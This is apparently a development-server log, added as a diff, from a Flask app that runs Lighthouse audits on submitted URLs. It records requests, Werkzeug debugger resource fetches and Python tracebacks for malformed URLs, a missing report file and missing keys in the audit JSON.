+5.71.196.245 - - [02/Dec/2020 10:24:28] "[37mGET /processurl?data=103 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:24:31] "[32mGET /processurl?data=103 HTTP/1.1[0m" 302 -
+5.71.196.245 - - [02/Dec/2020 10:24:31] "[37mGET /report?report=103 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:24:39] "[37mGET /list HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:24:51] "[37mGET / HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:24:55] "[35m[1mPOST /processurl HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 38, in processurl
+    urlopen(urlRequested)
+  File "/usr/lib/python3.8/urllib/request.py", line 222, in urlopen
+    return opener.open(url, data, timeout)
+  File "/usr/lib/python3.8/urllib/request.py", line 509, in open
+    req = Request(fullurl, data)
+  File "/usr/lib/python3.8/urllib/request.py", line 328, in __init__
+    self.full_url = url
+  File "/usr/lib/python3.8/urllib/request.py", line 354, in full_url
+    self._parse()
+  File "/usr/lib/python3.8/urllib/request.py", line 383, in _parse
+    raise ValueError("unknown url type: %r" % self.full_url)
+ValueError: unknown url type: 'example.com'
+5.71.196.245 - - [02/Dec/2020 10:24:55] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:24:55] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:24:55] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:24:55] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:24:55] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:24:55] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:28:25] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on ftp://ftp.ingv.it/pub/manuela.sbarra/Data%20Mining%20Practical%20Machine%20Learning%20Tools%20and%20Techniques%20-%20WEKA.pdf ...
+
+5.71.196.245 - - [02/Dec/2020 10:28:28] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:28:31] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:28:35] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:28:38] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:28:42] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:28:45] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:28:48] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:28:52] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:28:55] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:28:59] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:02] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:05] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:09] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:12] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:15] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:19] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:22] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:26] "[37mGET /processurl?data=104 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:28] "[37mGET / HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:29] "[37mGET /list HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:31] "[35m[1mGET /report?report=104 HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 135, in report
+    with open(path + filename) as json_file:
+FileNotFoundError: [Errno 2] No such file or directory: 'static/reports/02-12-2020-10:28-ingv.json'
+5.71.196.245 - - [02/Dec/2020 10:29:31] "[37mGET /report?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:31] "[37mGET /report?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:31] "[37mGET /report?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:31] "[37mGET /report?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:31] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:29:31] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:43:53] "[37mGET / HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:43:53] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:43:53] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:43:53] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:43:53] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:07] "[35m[1mPOST /processurl HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 38, in processurl
+    urlopen(urlRequested)
+  File "/usr/lib/python3.8/urllib/request.py", line 222, in urlopen
+    return opener.open(url, data, timeout)
+  File "/usr/lib/python3.8/urllib/request.py", line 509, in open
+    req = Request(fullurl, data)
+  File "/usr/lib/python3.8/urllib/request.py", line 328, in __init__
+    self.full_url = url
+  File "/usr/lib/python3.8/urllib/request.py", line 354, in full_url
+    self._parse()
+  File "/usr/lib/python3.8/urllib/request.py", line 383, in _parse
+    raise ValueError("unknown url type: %r" % self.full_url)
+ValueError: unknown url type: 'www.paulpirie.com'
+82.46.25.11 - - [02/Dec/2020 10:44:07] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:07] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:07] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:07] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:08] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:08] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:17] "[35m[1mPOST /processurl HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 38, in processurl
+    urlopen(urlRequested)
+  File "/usr/lib/python3.8/urllib/request.py", line 222, in urlopen
+    return opener.open(url, data, timeout)
+  File "/usr/lib/python3.8/urllib/request.py", line 509, in open
+    req = Request(fullurl, data)
+  File "/usr/lib/python3.8/urllib/request.py", line 328, in __init__
+    self.full_url = url
+  File "/usr/lib/python3.8/urllib/request.py", line 354, in full_url
+    self._parse()
+  File "/usr/lib/python3.8/urllib/request.py", line 383, in _parse
+    raise ValueError("unknown url type: %r" % self.full_url)
+ValueError: unknown url type: 'http@//www.paulpirie.com'
+82.46.25.11 - - [02/Dec/2020 10:44:17] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:17] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:17] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:17] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:17] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:17] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:21] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:55] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:44:57] "[37mGET / HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:45:04] "[37mGET /list HTTP/1.1[0m" 200 -
+82.46.25.11 - - [02/Dec/2020 10:45:12] "[37mGET /report?report=75 HTTP/1.1[0m" 200 -
+89.248.171.97 - - [02/Dec/2020 10:48:47] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00u\x01\x00\x00q\x03\x03¥\x12\x8a\x8e>ÛcI\x91\x18Ò\x9cÍî\x17à\x95o=\x03ÎÏ[\x9d"C\x98øPÃ\x88Z\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+89.248.171.97 - - [02/Dec/2020 10:48:47] "[35m[1m u  q¥>ÛcIÒÍîào=ÎÏ["CøPÃZ  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+86.186.194.64 - - [02/Dec/2020 11:06:23] "[37mGET / HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:06:24] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:06:24] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:06:24] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:06:24] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:06:43] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://webtech-napier-ui.ew.r.appspot.com/login ...
+
+86.186.194.64 - - [02/Dec/2020 11:06:46] "[37mGET /processurl?data=105 HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:06:50] "[37mGET /processurl?data=105 HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:06:53] "[32mGET /processurl?data=105 HTTP/1.1[0m" 302 -
+86.186.194.64 - - [02/Dec/2020 11:06:53] "[35m[1mGET /report?report=105 HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 139, in report
+    class reportClass:
+  File "/home/FlaskApp/audt.py", line 153, in reportClass
+    altScoreAmount = len(data['audits']['image-alt']['details']['items'])
+KeyError: 'details'
+86.186.194.64 - - [02/Dec/2020 11:06:53] "[37mGET /report?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:06:53] "[37mGET /report?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:06:53] "[37mGET /report?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:06:54] "[37mGET /report?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:06:54] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:06:54] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:07:53] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://webtech-napier-ui.ew.r.appspot.com/ ...
+
+86.186.194.64 - - [02/Dec/2020 11:07:57] "[37mGET /processurl?data=106 HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:08:00] "[37mGET /processurl?data=106 HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:08:04] "[32mGET /processurl?data=106 HTTP/1.1[0m" 302 -
+86.186.194.64 - - [02/Dec/2020 11:08:04] "[35m[1mGET /report?report=106 HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 139, in report
+    class reportClass:
+  File "/home/FlaskApp/audt.py", line 153, in reportClass
+    altScoreAmount = len(data['audits']['image-alt']['details']['items'])
+KeyError: 'details'
+86.186.194.64 - - [02/Dec/2020 11:08:04] "[37mGET /report?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:08:04] "[37mGET /report?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:08:04] "[37mGET /report?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:08:04] "[37mGET /report?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:08:05] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:09:30] "[37mGET /list HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:09:49] "[35m[1mGET /report?report=106 HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 139, in report
+    class reportClass:
+  File "/home/FlaskApp/audt.py", line 153, in reportClass
+    altScoreAmount = len(data['audits']['image-alt']['details']['items'])
+KeyError: 'details'
+86.186.194.64 - - [02/Dec/2020 11:09:49] "[37mGET /report?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:09:49] "[37mGET /report?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:09:49] "[37mGET /report?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:09:49] "[37mGET /report?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:09:49] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:09:53] "[37mGET /report?report=83 HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:10:31] "[37mGET / HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:10:36] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:10:47] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on http://harikharel.com/ ...
+
+86.186.194.64 - - [02/Dec/2020 11:10:50] "[37mGET /processurl?data=107 HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:10:54] "[37mGET /processurl?data=107 HTTP/1.1[0m" 200 -
+
+WARNING: The page may not be loading as expected because your test URL (http://harikharel.com/) was redirected to https://webtech-napier-ui.ew.r.appspot.com/. Try testing the second URL directly.
+
+
+86.186.194.64 - - [02/Dec/2020 11:10:57] "[32mGET /processurl?data=107 HTTP/1.1[0m" 302 -
+86.186.194.64 - - [02/Dec/2020 11:10:57] "[35m[1mGET /report?report=107 HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 139, in report
+    class reportClass:
+  File "/home/FlaskApp/audt.py", line 153, in reportClass
+    altScoreAmount = len(data['audits']['image-alt']['details']['items'])
+KeyError: 'details'
+86.186.194.64 - - [02/Dec/2020 11:10:57] "[37mGET /report?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:10:57] "[37mGET /report?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:10:57] "[37mGET /report?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
